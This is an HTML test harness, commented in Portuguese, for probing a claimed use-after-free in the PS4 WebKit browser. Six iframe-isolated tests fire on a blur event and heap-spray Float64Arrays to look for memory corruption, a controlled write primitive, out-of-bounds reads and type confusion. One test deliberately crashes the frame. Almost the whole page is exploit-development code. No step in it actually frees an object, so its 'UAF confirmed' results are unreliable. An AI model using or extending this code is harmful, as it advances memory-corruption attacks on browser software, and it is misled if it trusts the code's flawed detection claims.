<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit UAF - Testes de Sanidade (Isolated)</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a1a;
            color: #00ff00;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        .test-section {
            background: #2a2a2a;
            border: 2px solid #00ff00;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
        button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            margin: 5px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 3px;
        }
        button:hover {
            background: #00cc00;
        }
        button:disabled {
            background: #666;
            cursor: not-allowed;
        }
        .log {
            background: #000;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #00ff00;
            max-height: 400px;
            overflow-y: auto;
            font-size: 12px;
        }
        .success { color: #00ff00; }
        .warning { color: #ffff00; }
        .error { color: #ff0000; }
        .info { color: #00aaff; }
        h2 { color: #00ff00; border-bottom: 2px solid #00ff00; }
        .hex { font-family: monospace; color: #ff00ff; }
        #testFrame {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            border: none;
        }
        .status-indicator {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 3px;
            margin-left: 10px;
            font-weight: bold;
        }
        .status-idle { background: #444; color: #aaa; }
        .status-running { background: #ff8800; color: #000; }
        .status-complete { background: #00ff00; color: #000; }
        .status-crashed { background: #ff0000; color: #fff; }
    </style>
</head>
<body>

<h1>üî¨ PS4 WebKit UAF - Testes Isolados com iFrame</h1>

<div class="test-section">
    <h2>üìã Arquitetura do Teste</h2>
    <p><strong>COMO FUNCIONA:</strong></p>
    <ol>
        <li>Cada teste roda em um <strong>iframe isolado</strong></li>
        <li>O iframe entra em fullscreen automaticamente</li>
        <li>Voc√™ pressiona <strong>OPTIONS</strong> (blur trigger)</li>
        <li>O teste executa e envia logs para janela principal via postMessage</li>
        <li>document.write() mata o iframe, mas logs ficam salvos aqui</li>
    </ol>
    <p class="warning">‚ö†Ô∏è O crash fica contido no iframe - a p√°gina principal sobrevive!</p>
</div>

<!-- TESTE 1: Detec√ß√£o de Corrup√ß√£o -->
<div class="test-section">
    <h2>üß™ Teste 1: Detec√ß√£o de Corrup√ß√£o de Mem√≥ria</h2>
    <p>Verifica se h√° UAF real alterando valores em mem√≥ria</p>
    <button id="btn1" onclick="runTest(1)">‚ñ∂Ô∏è Executar Teste 1</button>
    <span id="status1" class="status-indicator status-idle">IDLE</span>
    <button onclick="clearLog('log1')">üóëÔ∏è Limpar</button>
    <div id="log1" class="log"></div>
</div>

<!-- TESTE 2: Verifica√ß√£o de Controle -->
<div class="test-section">
    <h2>üéØ Teste 2: Verifica√ß√£o de Controle de Escrita</h2>
    <p>Tenta escrever padr√µes espec√≠ficos e verificar persist√™ncia</p>
    <button id="btn2" onclick="runTest(2)">‚ñ∂Ô∏è Executar Teste 2</button>
    <span id="status2" class="status-indicator status-idle">IDLE</span>
    <button onclick="clearLog('log2')">üóëÔ∏è Limpar</button>
    <div id="log2" class="log"></div>
</div>

<!-- TESTE 3: Leitura OOB -->
<div class="test-section">
    <h2>üìñ Teste 3: Out-of-Bounds Read</h2>
    <p>Tenta ler al√©m dos limites do array para vazamento de dados</p>
    <button id="btn3" onclick="runTest(3)">‚ñ∂Ô∏è Executar Teste 3</button>
    <span id="status3" class="status-indicator status-idle">IDLE</span>
    <button onclick="clearLog('log3')">üóëÔ∏è Limpar</button>
    <div id="log3" class="log"></div>
</div>

<!-- TESTE 4: Type Confusion -->
<div class="test-section">
    <h2>üîÄ Teste 4: Type Confusion Check</h2>
    <p>Verifica se pode causar confus√£o de tipos manipulando objetos</p>
    <button id="btn4" onclick="runTest(4)">‚ñ∂Ô∏è Executar Teste 4</button>
    <span id="status4" class="status-indicator status-idle">IDLE</span>
    <button onclick="clearLog('log4')">üóëÔ∏è Limpar</button>
    <div id="log4" class="log"></div>
</div>

<!-- TESTE 5: Heap Spray Effectiveness -->
<div class="test-section">
    <h2>üíâ Teste 5: Efetividade do Heap Spray</h2>
    <p>Mede quantos objetos s√£o corrompidos pelo spray</p>
    <button id="btn5" onclick="runTest(5)">‚ñ∂Ô∏è Executar Teste 5</button>
    <span id="status5" class="status-indicator status-idle">IDLE</span>
    <button onclick="clearLog('log5')">üóëÔ∏è Limpar</button>
    <div id="log5" class="log"></div>
</div>

<!-- TESTE 6: Crash Controllability -->
<div class="test-section">
    <h2>üí• Teste 6: Controlabilidade do Crash</h2>
    <p class="error">‚ö†Ô∏è ESTE TESTE VAI CRASHAR O IFRAME (mas n√£o a p√°gina principal)</p>
    <button id="btn6" onclick="runTest(6)">‚ñ∂Ô∏è Executar Teste 6 (CRASH)</button>
    <span id="status6" class="status-indicator status-idle">IDLE</span>
    <button onclick="clearLog('log6')">üóëÔ∏è Limpar</button>
    <div id="log6" class="log"></div>
</div>

<!-- iframe invis√≠vel para testes -->
<iframe id="testFrame"></iframe>

<script>
// Estado global
let currentTest = 0;
let testTimeout = null;

// Listener para mensagens do iframe
window.addEventListener('message', function(e) {
    if (e.data.type === 'log') {
        log('log' + currentTest, e.data.message, e.data.level);
    } else if (e.data.type === 'status') {
        updateStatus(currentTest, e.data.status);
    } else if (e.data.type === 'complete') {
        completeTest(currentTest);
    }
});

function updateStatus(testNum, status) {
    const statusEl = document.getElementById('status' + testNum);
    statusEl.className = 'status-indicator status-' + status;
    statusEl.textContent = status.toUpperCase();
}

function log(logId, message, type = 'info') {
    const logDiv = document.getElementById(logId);
    const timestamp = new Date().toLocaleTimeString();
    logDiv.innerHTML += `<div class="${type}">[${timestamp}] ${message}</div>`;
    logDiv.scrollTop = logDiv.scrollHeight;
}

function clearLog(logId) {
    document.getElementById(logId).innerHTML = '';
}

function completeTest(testNum) {
    updateStatus(testNum, 'complete');
    document.getElementById('btn' + testNum).disabled = false;
    
    // Limpar timeout
    if (testTimeout) {
        clearTimeout(testTimeout);
        testTimeout = null;
    }
    
    // Remover iframe e criar novo
    setTimeout(() => {
        const oldFrame = document.getElementById('testFrame');
        oldFrame.parentNode.removeChild(oldFrame);
        
        const newFrame = document.createElement('iframe');
        newFrame.id = 'testFrame';
        document.body.appendChild(newFrame);
    }, 1000);
}

function runTest(testNum) {
    currentTest = testNum;
    clearLog('log' + testNum);
    
    log('log' + testNum, 'üöÄ Inicializando Teste ' + testNum + '...', 'info');
    updateStatus(testNum, 'running');
    
    // Desabilitar bot√£o
    document.getElementById('btn' + testNum).disabled = true;
    
    // Timeout de seguran√ßa (30s)
    testTimeout = setTimeout(() => {
        log('log' + testNum, '‚è±Ô∏è Timeout! Teste n√£o completou em 30s', 'error');
        updateStatus(testNum, 'crashed');
        document.getElementById('btn' + testNum).disabled = false;
    }, 30000);
    
    // Carregar teste no iframe
    const iframe = document.getElementById('testFrame');
    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
    
    iframeDoc.open();
    iframeDoc.write(generateTestHTML(testNum));
    iframeDoc.close();
}

function generateTestHTML(testNum) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Test ${testNum}</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background: #000;
            color: #0f0;
            font-family: monospace;
            font-size: 20px;
        }
        #status {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-size: 32px;
        }
    </style>
</head>
<body>
    <div id="status">
        <h1>TESTE ${testNum}</h1>
        <p id="msg">Preparando...</p>
    </div>
    
    <script>
        const testNum = ${testNum};
        
        function log(message, level = 'info') {
            window.parent.postMessage({
                type: 'log',
                message: message,
                level: level
            }, '*');
        }
        
        function updateStatus(status) {
            window.parent.postMessage({
                type: 'status',
                status: status
            }, '*');
        }
        
        function complete() {
            window.parent.postMessage({
                type: 'complete'
            }, '*');
        }
        
        function toHex(value) {
            try {
                const buffer = new ArrayBuffer(8);
                new Float64Array(buffer)[0] = value;
                return '0x' + Array.from(new Uint8Array(buffer))
                    .reverse()
                    .map(b => b.toString(16).padStart(2, '0'))
                    .join('');
            } catch(e) {
                return 'ERROR';
            }
        }
        
        function msg(text) {
            document.getElementById('msg').textContent = text;
        }
        
        // Iniciar teste ap√≥s pequeno delay
        setTimeout(() => {
            msg('Entrando em fullscreen...');
            log('üñ•Ô∏è Solicitando fullscreen...', 'info');
            
            const elem = document.documentElement;
            const enterFS = elem.webkitRequestFullscreen || elem.requestFullscreen;
            
            if (enterFS) {
                enterFS.call(elem).then(() => {
                    msg('FULLSCREEN ATIVO\\n\\nPRESSIONE OPTIONS!');
                    log('‚úÖ Fullscreen ativado - AGUARDANDO OPTIONS', 'warning');
                    setupTest${testNum}();
                }).catch(err => {
                    log('‚ùå Erro ao entrar em fullscreen: ' + err, 'error');
                    complete();
                });
            } else {
                log('‚ùå Fullscreen API n√£o dispon√≠vel', 'error');
                complete();
            }
        }, 500);
        
        ${getTestCode(testNum)}
    <\/script>
</body>
</html>`;
}

function getTestCode(testNum) {
    const tests = {
        1: `
function setupTest1() {
    let victims = [];
    const MAGIC = 2.121995791e-314;
    const COUNT = 3000;
    
    log('üì¶ Criando ' + COUNT + ' arrays Float64...', 'info');
    for(let i = 0; i < COUNT; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        arr[1] = i * 2;
        victims.push(arr);
    }
    log('‚úÖ Arrays criados', 'success');
    
    window.onblur = function() {
        msg('BLUR DETECTADO!\\n\\nExecutando...');
        log('‚ö° BLUR EVENT DETECTADO!', 'warning');
        
        log('üíâ Executando heap spray...', 'info');
        let spray = [];
        for(let i = 0; i < 5000; i++) {
            let arr = new Float64Array(10);
            arr.fill(MAGIC);
            spray.push(arr);
        }
        log('‚úÖ Spray completo (5000 arrays)', 'success');
        
        log('üîç Verificando corrup√ß√£o...', 'info');
        let corruptedCount = 0;
        let indexes = [];
        
        for(let i = 0; i < victims.length; i++) {
            if (victims[i][0] === MAGIC) {
                corruptedCount++;
                indexes.push(i);
                
                if (corruptedCount <= 3) {
                    log('üéØ CORRUP√á√ÉO no index ' + i + '!', 'error');
                    log('   [0]: ' + toHex(victims[i][0]), 'hex');
                    log('   [1]: ' + toHex(victims[i][1]), 'hex');
                }
            }
        }
        
        if (corruptedCount > 0) {
            const rate = (corruptedCount/COUNT*100).toFixed(2);
            log('', 'success');
            log('üî• UAF CONFIRMADO!', 'error');
            log('üìä ' + corruptedCount + ' arrays corrompidos (' + rate + '%)', 'warning');
            log('üìç √çndices: ' + indexes.slice(0, 10).join(', ') + '...', 'info');
            msg('UAF CONFIRMADO!\\n' + corruptedCount + ' corrompidos');
        } else {
            log('‚ùå Nenhuma corrup√ß√£o detectada', 'warning');
            msg('Sem corrup√ß√£o detectada');
        }
        
        setTimeout(() => complete(), 2000);
    };
}`,
        
        2: `
function setupTest2() {
    let victims = [];
    const SPRAY = 2.121995791e-314;
    
    for(let i = 0; i < 3000; i++) {
        victims.push(new Float64Array(8));
    }
    log('‚úÖ V√≠timas preparadas', 'success');
    
    window.onblur = function() {
        msg('Executando escrita...');
        log('‚ö° Trigger detectado', 'warning');
        
        let spray = [];
        for(let i = 0; i < 5000; i++) {
            spray.push(new Float64Array(10).fill(SPRAY));
        }
        
        let corrupted = null;
        let idx = -1;
        for(let i = 0; i < victims.length; i++) {
            if (victims[i][0] === SPRAY) {
                corrupted = victims[i];
                idx = i;
                break;
            }
        }
        
        if (corrupted) {
            log('üéØ V√≠tima encontrada: index ' + idx, 'error');
            log('‚úçÔ∏è Testando escrita controlada...', 'info');
            
            const patterns = [0xDEADBEEF, 0x1337C0DE, 0x42424242];
            let writeSuccess = 0;
            
            patterns.forEach((pattern, i) => {
                try {
                    const buf = new ArrayBuffer(8);
                    new BigUint64Array(buf)[0] = BigInt(pattern);
                    corrupted[i] = new Float64Array(buf)[0];
                    
                    const rbuf = new ArrayBuffer(8);
                    new Float64Array(rbuf)[0] = corrupted[i];
                    const read = Number(new BigUint64Array(rbuf)[0]);
                    
                    if (read === pattern) {
                        log('   ‚úÖ [' + i + ']: Write/Read OK - 0x' + pattern.toString(16), 'success');
                        writeSuccess++;
                    } else {
                        log('   ‚ö†Ô∏è [' + i + ']: Mismatch! W:0x' + pattern.toString(16) + ' R:0x' + read.toString(16), 'warning');
                    }
                } catch(e) {
                    log('   ‚ùå [' + i + ']: ' + e.message, 'error');
                }
            });
            
            if (writeSuccess === patterns.length) {
                log('', 'info');
                log('üéâ PRIMITIVA DE ESCRITA 100% FUNCIONAL!', 'success');
                msg('ESCRITA FUNCIONAL!\\n' + writeSuccess + '/3 OK');
            } else {
                log('‚ö†Ô∏è Escrita parcial: ' + writeSuccess + '/' + patterns.length, 'warning');
                msg('Escrita parcial\\n' + writeSuccess + '/3');
            }
        } else {
            log('‚ùå Corrup√ß√£o n√£o detectada', 'warning');
            msg('Sem corrup√ß√£o');
        }
        
        setTimeout(() => complete(), 2000);
    };
}`,
        
        3: `
function setupTest3() {
    let victims = [];
    const SPRAY = 2.121995791e-314;
    
    for(let i = 0; i < 3000; i++) {
        victims.push(new Float64Array(8));
    }
    
    window.onblur = function() {
        msg('Testando OOB...');
        log('‚ö° Spray iniciado', 'info');
        
        let spray = [];
        for(let i = 0; i < 5000; i++) {
            spray.push(new Float64Array(10).fill(SPRAY));
        }
        
        let corrupted = victims.find(v => v[0] === SPRAY);
        
        if (corrupted) {
            log('üéØ V√≠tima encontrada!', 'error');
            log('üìñ Tentando leitura OOB...', 'info');
            
            const limits = [8, 16, 32, 64, 128];
            let oobConfirmed = false;
            
            limits.forEach(limit => {
                let success = 0;
                let unique = new Set();
                
                for(let i = 0; i < limit; i++) {
                    try {
                        const val = corrupted[i];
                        if (val !== undefined) {
                            success++;
                            unique.add(toHex(val));
                        }
                    } catch(e) {}
                }
                
                log('Limite ' + limit + ': ' + success + ' lidos, ' + unique.size + ' √∫nicos', 'info');
                
                if (success > 8) {
                    const extra = success - 8;
                    log('üî• OOB READ! +' + extra + ' bytes al√©m do limite', 'error');
                    oobConfirmed = true;
                }
            });
            
            if (oobConfirmed) {
                msg('OOB READ\\nCONFIRMADO!');
            } else {
                msg('OOB n√£o detectado');
            }
        } else {
            log('‚ùå Sem corrup√ß√£o', 'warning');
            msg('Sem corrup√ß√£o');
        }
        
        setTimeout(() => complete(), 2000);
    };
}`,
        
        4: `
function setupTest4() {
    let typed = [];
    let objs = [];
    
    for(let i = 0; i < 1500; i++) {
        typed.push(new Float64Array(8).fill(i));
        objs.push({id: i, data: "obj_" + i, nested: {v: i*2}});
    }
    log('‚úÖ Typed arrays e objetos JS criados', 'success');
    
    window.onblur = function() {
        msg('Type confusion test...');
        log('‚ö° Spray...', 'info');
        
        const P = 2.121995791e-314;
        let spray = [];
        for(let i = 0; i < 5000; i++) {
            spray.push(new Float64Array(10).fill(P));
        }
        
        log('üîç Verificando type confusion...', 'info');
        
        let objCorr = 0;
        objs.forEach((o, i) => {
            try {
                if (typeof o.id !== 'number' || o.id !== i) {
                    objCorr++;
                    if (objCorr <= 3) {
                        log('üî• Objeto[' + i + '] corrompido!', 'error');
                    }
                }
            } catch(e) {
                objCorr++;
            }
        });
        
        let typedCorr = typed.filter(v => v[0] === P).length;
        
        log('üìä Float64: ' + typedCorr + ' corrompidos', typedCorr > 0 ? 'error' : 'success');
        log('üìä Objetos JS: ' + objCorr + ' corrompidos', objCorr > 0 ? 'error' : 'success');
        
        if (objCorr > 0) {
            log('üî• TYPE CONFUSION POSS√çVEL!', 'error');
            msg('TYPE CONFUSION!\\nObjs: ' + objCorr);
        } else {
            msg('Sem type confusion\\nTyped: ' + typedCorr);
        }
        
        setTimeout(() => complete(), 2000);
    };
}`,
        
        5: `
function setupTest5() {
    const COUNT = 5000;
    let victims = [];
    
    for(let i = 0; i < COUNT; i++) {
        victims.push(new Float64Array(8).fill(i));
    }
    
    window.onblur = function() {
        msg('Spray effectiveness...');
        log('üíâ Testando configs de spray...', 'info');
        
        const configs = [
            {size: 1000, p: 0x1111},
            {size: 5000, p: 0x2222},
            {size: 10000, p: 0x3333}
        ];
        
        configs.forEach((cfg, idx) => {
            const buf = new ArrayBuffer(8);
            new Uint32Array(buf)[0] = cfg.p;
            const fp = new Float64Array(buf)[0];
            
            let spray = [];
            for(let i = 0; i < cfg.size; i++) {
                spray.push(new Float64Array(10).fill(fp));
            }
            
            let corr = victims.filter(v => {
                const vb = new ArrayBuffer(8);
                new Float64Array(vb)[0] = v[0];
                return new Uint32Array(vb)[0] === cfg.p;
            }).length;
            
            const eff = (corr/COUNT*100).toFixed(2);
            log('Config ' + (idx+1) + ': size=' + cfg.size + ' ‚Üí ' + corr + ' (' + eff + '%)', corr > 0 ? 'error' : 'info');
        });
        
        msg('Spray test completo');
        setTimeout(() => complete(), 2000);
    };
}`,
        
        6: `
function setupTest6() {
    let victims = [];
    for(let i = 0; i < 3000; i++) {
        victims.push(new Float64Array(8));
    }
    
    window.onblur = function() {
        msg('CRASH TEST\\n\\nPreparando...');
        log('‚ö° Corrup√ß√£o...', 'warning');
        
        const P = 2.121995791e-314;
        let spray = [];
        for(let i = 0; i < 5000; i++) {
            spray.push(new Float64Array(10).fill(P));
        }
        
        let corrupted = victims.find(v => v[0] === P);
        
        if (corrupted) {
            log('üéØ V√≠tima corrompida!', 'error');
            log('üí• CRASH em 3s...', 'error');
            
            let countdown = 3;
            const interval = setInterval(() => {
                log(countdown + '...', 'error');
                msg('CRASH EM\\n' + countdown + 's');
                countdown--;
                
                if (countdown < 0) {
                    clearInterval(interval);
                    log('üíÄ TRIGGERING CRASH NOW!', 'error');
                    msg('CRASHING NOW!');
                    
                    // Sequ√™ncia de crash
                    try {
                        document.open();
                        document.write('<html><body><h1>CRASH</h1></body></html>');
                        document.close();
                        setTimeout(() => location.reload(), 100);
                    } catch(e) {
                        log('Crash exception: ' + e.message, 'error');
                        complete();
                    }
                }
            }, 1000);
        } else {
            log('‚ùå Sem corrup√ß√£o - n√£o vai crashar', 'warning');
            msg('Sem corrup√ß√£o');
            setTimeout(() => complete(), 2000);
        }
    };
}`
    };
    
    return tests[testNum] || 'function setupTest() { log("Teste n√£o implementado", "error"); complete(); }';
}
</script>

</body>
</html>
